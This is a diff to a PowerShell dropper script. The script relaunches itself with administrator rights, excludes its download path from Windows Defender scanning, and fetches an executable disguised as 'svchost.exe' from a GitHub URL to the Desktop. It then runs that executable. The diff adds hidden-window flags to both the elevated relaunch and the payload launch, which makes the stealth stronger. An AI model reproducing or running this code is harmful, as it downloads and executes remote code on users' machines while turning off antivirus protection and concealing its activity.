@@ -5,7 +5,7 @@ function Run-AsAdmin {
     if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = "powershell.exe"
-        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+        $psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
         $psi.Verb = "runas"
         try {
             [Diagnostics.Process]::Start($psi) | Out-Null
@@ -21,7 +21,6 @@ function Run-AsAdmin {
 $scriptPath = $MyInvocation.MyCommand.Definition
 Run-AsAdmin -scriptPath $scriptPath
 
-# Simple obfuscation
 $exeUrl = "https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe"
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $destination = Join-Path -Path $desktopPath -ChildPath "svchost.exe"
@@ -40,6 +39,4 @@ Add-MpPreference -ExclusionPath $destination
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $destination
 
-Set-ItemProperty -Path $destination -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-
-Start-Process -FilePath $destination
+Start-Process -FilePath $destination -WindowStyle Hidden
